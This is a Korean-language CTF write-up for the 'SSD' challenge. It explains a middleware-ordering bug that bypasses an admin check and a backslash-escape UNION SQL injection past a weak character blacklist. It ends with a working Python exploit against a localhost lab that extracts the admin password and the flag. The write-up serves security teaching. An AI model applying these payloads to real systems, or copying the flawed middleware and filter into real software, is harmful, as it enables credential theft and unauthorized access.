# SSD

## Usage

- SSD CTF 2025

## Concept

- Logic Bug
- SQL Injection (Insufficient SQL Mitigation)

# Writeup

### Requirements

- [SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

## TLDR

1. Admin Validation Logic Bug : `adminMiddleware`가 `authMiddleware`보다 먼저 호출되어 `req.user`가 falsy한 값이어서 admin 검증을 우회할 수 있습니다.

2. SQL Injection : 불충분한 방어로직으로 인하여 `\`로 이스케이프 후에 Union Based SQL Injection으로 admin의 plain_password를 얻을 수 있습니다.

## Analysis

CTF Player의 시선에서 Write-Up을 써보도록 하겠습니다.

`mysql/init.sql` 파일을 확인하면 플래그가 admin 계정의 데이터로 저장되어 있음을 발견할 수 있습니다.

```sql
-- 데이터베이스 선택
USE ssd_database;

-- 권한 설정
GRANT ALL PRIVILEGES ON ssd_database.* TO 'ssd_user'@'%';
FLUSH PRIVILEGES;

-- users 테이블
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    plain_password VARCHAR(255),
    role ENUM('user','admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- datas 테이블
CREATE TABLE IF NOT EXISTS datas (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    data_key VARCHAR(100) NOT NULL,
    data_value TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

INSERT INTO users (username, email, plain_password, password, role) VALUES ('admin', 'admin@gmail.com', 'REDACTED' ,'$2b$10$DorSD/NoHqxl99kbvZsb1OEeaEs3XRgkSa.NvBEFNWTll.ouO1Qjq', 'admin');
INSERT INTO datas (user_id, data_key, data_value) VALUES (1, 'flag', 'SSD{021e44cef04f3d352e26ea75acfc6c1a}');
```

admin의 data에 flag를 추가합니다.
수상한 점은 plain_password를 저장한다는 점입니다.

```js
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const app = express();

let EXTERNAL_PORT = 3000;

const authAPI = require(path.join(__dirname, 'apis', 'auth.js'));
const adminAPI = require(path.join(__dirname, 'apis', 'admin.js'));
const ssdAPI = require(path.join(__dirname, 'apis', 'ssd.js'));

app.use(express.json());
app.use(cookieParser());

app.use('/api/auth', authAPI);
app.use('/api/admin', adminAPI);
app.use('/api/ssd', ssdAPI);

...

app.listen(
    EXTERNAL_PORT,
    () => {
        console.log('Server started');
    }
)
```

`src/index.js`를 살펴보면 authAPI, adminAPI, ssdAPI가 주요 기능임을 알 수 있습니다.
(출제자 노트 : 프론트엔드 제작이 귀찮았습니다 - 허허)

**authAPI**에는 간단한 register/login 기능이 존재하고 별다른 취약점은 존재하지 않아 보입니다.

Login후 JWT Sign된 token을 주는데 `src/middlewares/authMiddleware.js`를 보면 Bearer Token 형식으로 요청을 보내야 합니다.

```js
function authMiddleware(req, res, next) {
  const authHeader = req.headers["authorization"];

  const token = authHeader && authHeader.split(" ")[1];

  if (!token) {
    return res.status(401).json({ message: "토큰이 필요합니다." });
  }

  jwt.verify(token, SECRET_KEY, (err, user) => {
    if (err)
      return res.status(403).json({ message: "유효하지 않은 토큰입니다." });

    req.user = user;
    next();
  });
}
```

**adminAPI**에는 users를 나열할 수 있는 기능이 존재하고, `/dev`라는 수상한 엔드포인트가 있습니다.

```js
// TODO
router.post(
  "/dev",
  adminMiddleware,
  authMiddleware,
  typeGuard({
    username: String,
    email: String,
  }),
  sqlGuard(["username", "email"]),
  async (req, res) => {
    const { username, email } = req.body;

    try {
      const [rows] = await pool.query(
        `SELECT id, username, email, role, created_at FROM users WHERE username='${username}' AND email='${email}'`
      );
      res.json(rows);
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: "서버 오류" });
    }
  }
);
```

`sqlGuard`라는 보안 로직을 적용하고 있지만 사용자의 입력(username, email)이 query문에 그대로 입력되어 취약점이 발생할 가능성이 있습니다.

**ssdAPI**에는 간단한 CRUD가 구현되어 있습니다.

## Solution

admin 계정의 비밀번호는 hash만 저장되어 있어서 admin으로 로그인하는 것은 어려워 보입니다. (plain_password는 REDACTED로 보임.)

따라서 다른 취약점을 찾아서 공격해야 함을 알 수 있습니다.

### 1. Logic Bug

`src/apis/admin.js`를 자세히 살펴보면 취약점이 존재합니다.

```js
router.post("/dev", adminMiddleware, authMiddleware, typeGuard({
    username: String,
    email: String
}), sqlGuard([
    'username', 'email'
]), async (req, res) => {
    ...
});
```

middleware를 로드할 때 `adminMiddleware` -> `authMiddleware` 순서대로 로드하고 있습니다.

```js
function adminMiddleware(req, res, next) {
  if (req.user && req.user.role !== "admin") {
    return res.sendStatus(403);
  }
  return next();
}

module.exports = { adminMiddleware };
```

adminMiddleware는 `req.user && req.user.role !== "admin"`, 즉 로그인이 되었고, role이 admin이 아닐 때 403을 반환합니다.

하지만 authMiddleware를 거치지 않아 `req.user`는 undefined가 되고 이를 우회할 수 있습니다.

(IDOR 취약점이라 부르기도 합니다.)

이는 개발자가 저지를 수 있는 구현 상의 실수 중 하나입니다. 보안적 관점에서 이러한 일들을 예방하기 위해서는 Code Testing이 중요합니다.

또한 코드 분석을 통하지 않고도 우연히 요청을 보내다가 실행되는 것을 보고 취약점을 발견하셨을 수도 있을 것 같습니다.

### 2. SQL Injection

admin 검증을 우회하였으므로 이제 admin의 기능을 사용할 수 있습니다.

```js
// TODO
router.post(
  "/dev",
  adminMiddleware,
  authMiddleware,
  typeGuard({
    username: String,
    email: String,
  }),
  sqlGuard(["username", "email"]),
  async (req, res) => {
    const { username, email } = req.body;

    try {
      const [rows] = await pool.query(
        `SELECT id, username, email, role, created_at FROM users WHERE username='${username}' AND email='${email}'`
      );
      res.json(rows);
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: "서버 오류" });
    }
  }
);
```

typeGuard는 req.body를 검증하는 역할을 합니다.

```js
const express = require("express");

const router = express.Router();

/**
 *
 * @param {Object} config - {"Name": "Type"}
 * @returns
 */
const typeGuard = (config) => {
  /**
   *
   * @param {express.Request} req
   * @param {express.Response} res
   * @param {express.NextFunction} next
   */
  return (req, res, next) => {
    if (
      !config ||
      typeof config !== "object" ||
      (req.method != "POST" && req.method != "PUT")
    )
      return next();

    let body = Object.create(null);

    for (const name in config) {
      const type = config[name];
      const value = name in req.body && req.body[name];

      if (
        typeof value !== typeof type() ||
        value === undefined ||
        value === null
      )
        return res.sendStatus(400);
      body[name] = value;
    }

    req.body = body;
    return next();
  };
};
```

sqlGuard를 보면 간단하게 SQL Injection을 방어하고 있는 것을 알 수 있습니다.

```js
/**
 *
 * @param {Array} params
 * @param {String} mode
 * @returns
 */
const sqlGuard = (params, mode = "strict") => {
  STRICT = ["'", "-", "/", "*", "="];

  /**
   *
   * @param {express.Request} req
   * @param {express.Response} res
   * @param {express.NextFunction} next
   */
  if (mode == "strict")
    return (req, res, next) => {
      for (name of params) {
        const value = req.body[name];
        if (typeof value != "string") return res.sendStatus(400);

        if (STRICT.some((v, i) => value.includes(v)))
          return res.sendStatus(400);
      }
      return next();
    };
  else
    return (req, res, next) => {
      return next();
    };
};
```

애플리케이션은 `'`, `-`, `/`, `\*`, `=` 문자가 포함되어 있는지 검사하고, 발견되면 400을 반환합니다.
하지만 `\` 문자는 차단하지 않았기 때문에 이를 악용할 수 있습니다.

예를 들어, 다음과 같은 쿼리를 보낼 수 있습니다:

```sql
SELECT id, username, email, role, created_at
FROM users
WHERE username='\' AND email='EMAIL'
```

여기서 `\` 문자는 따옴표를 escape하여 `username='\' AND email=`까지를 하나의 문자열로 처리하게 만듭니다. 이후 이어지는 `EMAIL` 부분에서 문자열 구문을 벗어나면서 email 값에 원하는 SQL을 주입할 수 있게 됩니다.

plain_password를 구하기 위해서 Union을 사용하여 구할 수 있습니다.

```
username : \
email : and 0 union select id, username, plain_password, role, created_at from users where username like \"admin\";#
```

이후 admin으로 로그인하여 FLAG를 읽어오면 됩니다.

## Exploit

````py
import requests as req

url = 'http://localhost:3000'

with req.Session() as r:
    res = req.post(f'{url}/api/auth/register', json={
        'username': 'guest',
        'password': 'guest',
        'email': 'guest@gmail.com'
    })

    res = req.post(f'{url}/api/auth/login', json={
        'email': 'guest@gmail.com',
        'password': 'guest'
    })
    token = res.json().get('token')
    headers = {
        "authorization": f"Bearer {token}"
    }

    res = req.post(f'{url}/api/admin/dev', json={
        "username": "\\",
        "email": "and 0 union select id, username, plain_password, role, created_at from users where username like \"admin\";#"
    }, headers=headers)
    admin_password = res.json()[0].get('email')

    res = req.post(f'{url}/api/auth/login', json={
        'email': 'admin@gmail.com',
        'password': admin_password
    }) # local에서 test한다면 admin_password가 REDACTED로 나와서 에러나는 것이 정상.
    token = res.json().get('token')
    headers = {
        "authorization": f"Bearer {token}"
    }
    res = req.get(f'{url}/api/ssd/data', headers=headers)
    flag = res.json()[0].get('data_value')

    print(flag)
    ```
````
